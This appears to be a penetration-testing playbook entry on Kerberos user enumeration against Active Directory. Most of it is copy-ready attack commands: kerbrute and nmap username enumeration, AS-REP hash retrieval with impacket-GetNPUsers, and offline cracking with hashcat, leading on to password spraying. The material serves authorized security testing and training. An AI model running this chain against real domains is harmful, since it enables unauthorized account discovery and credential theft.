---
id: kerberos-enum
title: Kerberos User Enumeration
stage: enumeration
tags: [windows, ad, kerberos]
summary: Confirm valid domain usernames using KDC error code differences — no credentials required, and valid users can be immediately tested for AS-REP roastability.
leads_to:
  - asreproast
  - kerberoast
  - password-spray
  - ldap-enum
---

## Prerequisites

Port 88 open (domain controller). A domain name (get from SMB banner, DNS, or LDAP). No credentials required.

The Kerberos KDC returns different error codes for non-existent users (`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`) vs valid users with pre-auth required (`PREAUTH_REQUIRED`). This difference lets you enumerate valid usernames silently before any authentication attempt. The moment you have a valid user list, immediately test each for AS-REP roastability — accounts with `DONT_REQ_PREAUTH` yield crackable hashes with zero credentials.

## Quick Win

> Kerbrute — fastest user enumeration against the KDC, no auth required.

```bash
kerbrute userenum -d domain.local --dc $DC \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt
```

## Smaller Wordlist (Faster)

> Start here — covers most common AD account names in seconds.

```bash
kerbrute userenum -d domain.local --dc $DC \
  /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

## Nmap Fallback

> When kerbrute isn't available or for validation.

```bash
nmap -p88 --script krb5-enum-users \
  --script-args krb5-enum-users.realm='domain.local',userdb=/tmp/users.txt $DC
```

## Common AD Names to Try First

```
administrator  admin  guest  krbtgt
svc-backup  svc-admin  svc-sql  service
helpdesk  support  it-admin
```

## Immediately Test for AS-REP Roast

> Once you have valid users — request hashes for any without pre-auth.

```bash
impacket-GetNPUsers domain.local/ -no-pass \
  -usersfile valid_users.txt \
  -dc-ip $DC \
  -outputfile asrep_hashes.txt

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Leads To

Valid user list → asreproast (immediately), then password-spray with the list. AS-REP hashes cracked → authenticate as that user → ldap-enum and kerberoast. Valid user list alone is enough to begin password spraying — check lockout policy via SMB first.
